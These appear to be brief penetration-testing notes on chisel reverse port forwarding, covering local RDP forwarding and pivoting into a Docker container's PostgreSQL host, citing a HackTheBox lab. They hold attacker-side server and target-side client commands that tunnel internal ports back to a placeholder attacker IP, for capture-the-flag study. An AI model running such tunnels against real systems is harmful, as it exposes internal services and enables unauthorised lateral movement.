
Forwarding Local ports

(before moving chisel into the target machine, confirm the architecture of the target using 
`uname -a`)

Attacker machine:

`./chisel server -p 9001 --reverse`

Target Machine:

`./chisel client <attacker_ip>:9001 R:3389:127.0.0.1:3389`

For pivoting into the container, there is slight changes in the target machine, if we're forwarding ports in different hosts in the docker container. (Refer: Mentor - hackthebox)

Attacker machine:

`./chisel server -p 9001 --reverse`

Target Machine:

`./chisel client <attacker_ip>:9001 R:127.0.0.1:5432:172.22.0.4:5432`    

(forwarding 5432 and 172.22.0.4 is one of the hosts in container)





